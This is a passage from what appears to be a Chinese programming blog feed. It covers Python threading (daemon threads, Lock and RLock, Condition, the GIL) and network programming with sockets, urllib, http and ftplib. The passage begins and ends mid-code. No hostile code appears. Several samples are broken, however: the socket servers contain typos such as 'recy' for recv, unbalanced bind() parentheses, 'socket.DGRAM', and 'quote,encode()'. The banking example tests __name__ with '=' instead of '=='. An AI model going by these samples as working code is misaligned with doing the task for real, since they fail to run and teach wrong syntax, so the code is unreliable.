string">'线程'</span><span class="token operator">+</span>t<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">'结束'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主线程开始'</span><span class="token punctuation">)</span>  t1<span class="token operator">=</span>MyThread<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  t2<span class="token operator">=</span>MyThreadDaemon<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  t1<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'t1'</span>  t2<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'t2'</span>  t2<span class="token punctuation">.</span>daemon<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token comment" spellcheck="true">#设置为daemon</span>  t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主线程结束'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>  test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><img src="https://www.hualigs.cn/image/604b8bae40e03.jpg" alt=""></li></ul><h1 id="三、线程同步"><a href="#三、线程同步" class="headerlink" title="三、线程同步"></a>三、线程同步</h1><h2 id="1-基于原语锁（Lock-RLock对象）的简单同步"><a href="#1-基于原语锁（Lock-RLock对象）的简单同步" class="headerlink" title="1. 基于原语锁（Lock/RLock对象）的简单同步"></a>1. 基于原语锁（Lock/RLock对象）的简单同步</h2><p><strong>用锁使多线程同时操作同一资源时不产生混乱</strong></p><ul><li>Lock是可用的最低级的同步指令。Lock处于锁定状态时，不被特定的线程拥有。Lock包含两种状态——锁定和非锁定，以及两个基本的方法。</li><li>可以认为Lock有一个锁定池，当线程请求锁定时，将线程至于池中，直到获得锁定后出池。池中的线程处于状态图中的同步阻塞状态。</li><li>RLock（可重入锁）是一个可以被同一个线程请求多次的同步指令。RLock使用了“拥有的线程”和“递归等级”的概念，处于锁定状态时，RLock被某个线程拥有。拥有RLock的线程可以再次调用acquire()，释放锁时需要调用release()相同次数。</li><li>可以认为RLock包含一个锁定池和一个初始值为0的计数器，每次成功调用acquire()/release()，计数器将+1/-1，为0时锁处于未锁定状态。</li><li>简言之：Lock属于全局，RLock属于线程。</li><li>构造方法：Lock(), Rlock()（推荐使用Rlock()）</li><li>实例方法：<ul><li>acquire([timeout]): 尝试获得锁定。使线程进入同步阻塞状态。</li><li>release(): 释放锁。使用前线程必须已获得锁定，否则将抛出异常。</li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#题目：使用lock语句同步代码块示例。创建工作线程，模拟银行现金账户取款。多个线程同时执行取款操作时，如果不使用同步处理，会造成账户余额混乱；尝试使用同步锁对象Lock，以保证多个线程同时执行取款操作时，银行现金账户取款的有效和一致。</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token keyword">class</span> <span class="token class-name">Account</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#继承threading.Thread</span>    lock<span class="token operator">=</span>threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建锁</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#构造函数</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用父类构造函数</span>        Account<span class="token punctuation">.</span>amount<span class="token operator">=</span>amount    <span class="token comment" spellcheck="true">#账户金额</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>withdraw<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#取款</span>    <span class="token keyword">def</span> <span class="token function">withdraw</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        Account<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取锁，注释不使用同步处理</span>        t<span class="token operator">=</span>threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span>        a<span class="token operator">=</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Account<span class="token punctuation">.</span>amount<span class="token operator">&lt;</span>a<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0}交易失败，取款前余额：{1}，取款额：{2}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>t<span class="token punctuation">.</span>name<span class="token punctuation">,</span>Account<span class="token punctuation">.</span>amount<span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>            Account<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true">#拒绝交易</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#随机睡眠0-5秒</span>        prev<span class="token operator">=</span>Account<span class="token punctuation">.</span>amount        Account<span class="token punctuation">.</span>amount<span class="token operator">-=</span>a    <span class="token comment" spellcheck="true">#取款</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0}取款前余额：{1}，取款额：{2}，取款后额：{3}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>t<span class="token punctuation">.</span>name<span class="token punctuation">,</span>prev<span class="token punctuation">,</span>a<span class="token punctuation">,</span>Account<span class="token punctuation">.</span>amount<span class="token punctuation">)</span><span class="token punctuation">)</span>        Account<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#释放锁。注释不使用同步处理</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#创建5个线程对象并启动</span>        Account<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">=</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604b8bae5a749.jpg" alt=""></p><h2 id="2-基于条件变量（Condition对象）的同步和通信"><a href="#2-基于条件变量（Condition对象）的同步和通信" class="headerlink" title="2. 基于条件变量（Condition对象）的同步和通信"></a>2. 基于条件变量（Condition对象）的同步和通信</h2><ul><li>Condition（条件变量）通常与一个锁关联。需要在多个Condition中共享一个锁时，可以传递一个Lock/RLock实例给构造方法，否则它将自己生成一个RLock实例。</li><li>除了Lock带有的锁定池外，Condition还包含一个等待池，池中的线程处于等待阻塞状态，直到另一线程调用notify()/notifyAll()通知；得到通知后线程进入锁定池等待锁定。</li><li>构造方法：Condition([lock/rlock])</li><li>实例方法：<ul><li>acquire([timeout])/release()：调用关联的锁的相应方法。</li><li>wait([timeout])：调用这个方法将使线程进入Condition的等待池等待通知，并释放锁。先释放获得的锁，然后阻塞，直到被唤醒或者超时，一旦被唤醒或者超时，会重新获取锁（应该说抢锁），然后返回。</li><li>notify()：从等待池挑选一个线程并通知，收到通知的线程将自动调用acquire()尝试获取锁定（进入锁定池）；其他线程仍然在等待池中。调用这个方法不会释放锁定。使用前线程必须已获得锁定，否则将抛出异常。</li><li>notifyAll()：通知等待池中所有的线程，这些线程都将进入锁定池尝试获得锁定。调用这个方法不会释放锁定。使用前线程必须已获得锁定，否则将抛出异常。</li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#题目：将10000000递减到0程序终止，用单线程来执行，完成时间是多少？用多线程又会是多少？</span><span class="token comment" spellcheck="true">#任务</span><span class="token keyword">def</span> <span class="token function">decr</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> n<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        n<span class="token operator">-=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#单线</span><span class="token keyword">import</span> time start<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>decr<span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">)</span>cost<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>start<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'单线程耗时：'</span><span class="token punctuation">,</span>cost<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#多线</span><span class="token keyword">import</span> threadingstart<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>t1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>decr<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">5000000</span><span class="token punctuation">]</span><span class="token punctuation">)</span>t2<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>decr<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">5000000</span><span class="token punctuation">]</span><span class="token punctuation">)</span>t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#主线程阻塞，直到t1执行完成，主线程继续往后执行</span>t2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>cost<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>start<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'多线程耗时：'</span><span class="token punctuation">,</span>cost<span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604b8bae5b911.jpg" alt=""></p><p>（理论上多线程应该不快反慢的，这个结果…可能是因为python3.7对GIL机制进行了优化？）</p><p><strong>导致Python多线程不快反慢的原因：</strong></p><ul><li>在Cpython解释器（Python语言的主流解释器）中，有一把全局解释锁GIL（Global Interpreter Lock）</li><li>同一时刻，只有一个线程在运行，其它线程只能等待，即使是多核CPU，也没有办法让多个线程“并行”地同时执行代码，只能是交替执行，因为多线程涉及到上下文切换、锁机制处理（获取锁、释放锁等），所以，多线程执行不快反慢。</li></ul><p><strong>Python的应对：</strong></p><ul><li>多进程：multiprocessing标准库，让多进程的python程序编写简化到类似多线程的程度</li><li>计算密集性的程序用C代码编写并通过扩展的方式集成到Python脚本里（如NumPy模块）。在扩展里就完全可以用C创建原生线程，而且不用锁GIL</li><li>利用ctypes绕过GIL，让Python通过ctypes直接调用任意的C动态库的导出函数，ctypes会在调用C函数前释放GIL</li><li>更换解释器，如Jython、IronPython等无GIL解释器</li><li>使用python3.4或更高版本（对GIL机制进行了优化）</li><li>科学计算之类需要持续使用CPU的任务时，单线程会比多线程快<br>I- O操作等可能引起阻塞的任务（如爬取）时，多线程会比单线程快（遇到IO阻塞会自动释放GIL锁）<br>3/12/2021 11:54:53 PM </li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python网络编程和通信</title>
      <link href="2021/03/11/python-wang-luo-bian-cheng-he-tong-xin/"/>
      <url>2021/03/11/python-wang-luo-bian-cheng-he-tong-xin/</url>
      
        <content type="html"><![CDATA[<h1 id="一、基于SOCKET的网络编程"><a href="#一、基于SOCKET的网络编程" class="headerlink" title="一、基于SOCKET的网络编程"></a>一、基于SOCKET的网络编程</h1><p>套接字：网络中两个应用程序之间通信的端点</p><p><strong>基于套接字的TCPServer的网络编程一般包括以下基本步骤：</strong></p><p>（1）创建socket对象<br>（2）将socket绑定到指定地址上<br>（3）准备好套接字，以便接收连接请求<br>（4）通过socket对象方法accept，等待客户请求连接<br>（5）服务器和客户机通过send和recv方法通信（传输数据）<br>（6）传输结束，调用socket的close方法以关闭连接</p><p><strong>基于套接字的TCPClient的网络编程一般包括以下基本步骤：</strong></p><p>（1）创建socket对象<br>（2）通过socket对象方法connect连接服务器<br>（3）客户机和服务器通过send和recv方法通信（传输数据）<br>（4）传输结束，调用socket的close方法以关闭连接</p><p><strong>基于套接字的UDPServer的网络编程一般包括以下基本步骤：</strong><br>（UDP无连接数据包协议）</p><p>（1）创建socket对象<br>（2）将socket绑定到指定地址上<br>（3）服务器和客户机通过send和recv方法通信（传输数据）<br>（4）传输结束，调用socket的close方法以关闭连接</p><p><strong>基于套接字的UDPClient的网络编程一般包括以下基本步骤：</strong></p><p>（1）创建socket对象<br>（2）客户机和服务器通过send和recv方法通信（传输数据）<br>（3）传输结束，调用socket的close方法以关闭连接</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#题目——简单TCP程序：ECHO SERVER</span>基于TCP的Echo Server包括服务器<span class="token operator">/</span>客户机两个部分：服务端应用程序和客户机应用程序。服务端应用程序创建一个socket并绑定到某个IP地址：端口号上，然后侦听listen，并使用阻塞方法accept以等待客户机连接请求；客户机创建一个socket，并建立到服务器的连接；客户机循环接受用户数据并发送数据到服务器，服务器接收数据后回送（Echo）给客户机。客户机输入空数据时，关闭socket并终止运行；服务器接收到空数据时，关闭socket并终止运行。<span class="token comment" spellcheck="true">#服务端应用程序CHATSERVER   TCP</span><span class="token keyword">import</span> socketserversocket<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建服务器socket</span>serversocket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绑定到IP地址和端口号</span>serversocket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#开始侦听，队列长度为1</span>clientsocket<span class="token punctuation">,</span>clientaddress<span class="token operator">=</span>serversocket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#使用阻塞方法accept以等待客户机连接请求</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connection from'</span><span class="token punctuation">,</span>clientaddress<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#接受客户机请求后输出客户机的信息</span><span class="token keyword">while</span> <span class="token number">1</span> <span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#循环以接收和回送客户机数据</span>    data<span class="token operator">=</span>clientsocket<span class="token punctuation">.</span>recy<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#接收数据</span>    <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span> <span class="token keyword">break</span>    <span class="token comment" spellcheck="true">#接收到空数据时，终止循环</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Received from client:'</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出接收到的数据，repr函数转换为字符串</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Echo:'</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出发送到客户机数据的信息</span>    clientsocket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#回送数据到客户机</span>clientsocket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#关闭客户机socket</span>serversocket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#关闭服务器socket</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#ChatServerUDP.py</span><span class="token keyword">import</span> socketserversocket<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建服务器socket</span>serversocket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绑定到IP地址和端口号</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#循环以接收和回送客户机数据</span>    data<span class="token punctuation">,</span>address<span class="token operator">=</span>serversocket<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#接收数据，返回数据和客户机地址</span>    <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span><span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#接收到空数据时，终止循环</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Received from client:'</span><span class="token punctuation">,</span>address<span class="token punctuation">,</span>repr<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出接收到的数据，repr函数转换为字符串</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Echo:'</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出发送到客户机数据的信息</span>    serversocket<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>data<span class="token punctuation">,</span>address<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#发送数据到客户机</span>serversocket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#关闭服务器socket</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#服务器应用程序QUOTESERVER</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span>randomquotes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'不妄求，则心安，不妄做，则身安'</span><span class="token punctuation">,</span><span class="token string">'多门之室生风，多言之人生祸'</span><span class="token punctuation">,</span><span class="token string">'人之心胸，多欲则窄，寡欲则宽'</span><span class="token punctuation">,</span><span class="token string">'三人行，必有我师'</span><span class="token punctuation">,</span><span class="token string">'滴水穿石，磨杵成针'</span><span class="token punctuation">,</span><span class="token string">'是非天天有，不听自然无'</span><span class="token punctuation">,</span><span class="token string">'积德为产业，强胜于美宅良田'</span><span class="token punctuation">]</span>serversocket<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>DGRAM<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建服务器socket</span>serversocket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">8002</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绑定到IP地址和端口号</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#循环以接收和回送客户机数据</span>    data<span class="token punctuation">,</span>address<span class="token operator">=</span>serversocket<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#接收数据，返回数据和客户机地址</span>    quote<span class="token operator">=</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>quotes<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#从Quotes列表中随机选择一个项目</span>    serversocket<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>quote<span class="token punctuation">,</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>address<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#把数据转换为bytes对象，并发送数据到客户机</span>serversocket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#关闭服务器socket</span></code></pre><h1 id="二、基于URLLIB的网络编程"><a href="#二、基于URLLIB的网络编程" class="headerlink" title="二、基于URLLIB的网络编程"></a>二、基于URLLIB的网络编程</h1><ul><li>urllib.request(打开和读取URL）</li><li>urllib.parse(解析URL)</li><li>urllib.error(urllib.request引发的异常)</li><li>urllib.robotparser(解析robots.txt文件)</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#Request对象示例</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestf<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#打开URL资源</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#读取200个字节，返回bytes对象并输出</span>f<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#重新打开URL资源</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#读取200个字节，返回bytes对象，转换为字符串并输出</span><span class="token keyword">with</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com/'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#重新打开URL资源</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>'utf<span class="token number">-8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#读取返回bytes对象转换为字符串并输出</span></code></pre><p><strong>网站文件robots.txt</strong>(“robots协议”，并非规范，只是约定俗成的，并不能保证网站的隐私)：</p><p>告诉网络爬虫爬取该网站时存在哪些限制：存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。</p><pre class=" language-python"><code class="language-python"><span class="token operator">/</span><span class="token operator">*</span>创建REQUEST对象urllib<span class="token punctuation">.</span>request模块中Request对象的构造函数如下<span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>None<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> origin_req_host<span class="token operator">=</span>None<span class="token punctuation">,</span> unverifiable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> method<span class="token operator">=</span>None<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">def</span> <span class="token function">getURLInfo</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">:</span>    req<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">,</span>headers<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Request对象</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Full url:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>full_url<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#URL</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Host:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>host<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#主机和端口号</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Data:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>data<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#向服务器传送的数据</span><span class="token comment" spellcheck="true">#测试代码</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">'http://www.baidu.com/s'</span>    values<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'wd'</span><span class="token punctuation">:</span><span class="token string">'python'</span><span class="token punctuation">}</span>    data<span class="token operator">=</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>values<span class="token punctuation">)</span>    data<span class="token operator">=</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'UTF8'</span><span class="token punctuation">)</span>    headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/4.0(compatible;MSIE 5.5;Windows NT)'</span><span class="token punctuation">}</span>    getURLInfo<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">,</span>headers<span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604a3a405d054.jpg" alt=""></p><h1 id="三、基于HTTP的网络编程"><a href="#三、基于HTTP的网络编程" class="headerlink" title="三、基于HTTP的网络编程"></a>三、基于HTTP的网络编程</h1><ul><li>http.client （低级别的HTTP协议客户端，高级别的URL打开则使用urllib.request）</li><li>http.server （基于socketserver的HTTP服务器类）</li><li>http.cookies （使用cookies实现状态管理的工具）</li><li>http.cookiejar （提供cookies的持久性）</li></ul><h1 id="四、基于FTPLIB的网络编程"><a href="#四、基于FTPLIB的网络编程" class="headerlink" title="四、基于FTPLIB的网络编程"></a>四、基于FTPLIB的网络编程</h1><ul><li>创建FTP对象</li><li>创建FTP_TLS对象 （传输层安全协议）</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#创建FTP对象示例</span><span class="token keyword">from</span> ftplib <span class="token keyword">import</span> FTPftp<span class="token operator">=</span>FTP<span class="token punctuation">(</span><span class="token string">"ftp 1.at.proftpd.org"</span><span class="token punctuation">)</span>ftp<span class="token punctuation">.</span>login<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#无参数则匿名登录</span>ftp<span class="token punctuation">.</span>dir<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#罗列目录</span>ftp<span class="token punctuation">.</span>cwd<span class="token punctuation">(</span><span class="token string">'devel'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#切换当前目录</span>ftp<span class="token punctuation">.</span>dir<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#创建FTP_TLS对象</span><span class="token keyword">from</span> ftplib <span class="token keyword">import</span> FTP_TLSftps<span class="token operator">=</span>FTP_TLS<span class="token punctuation">(</span><span class="token 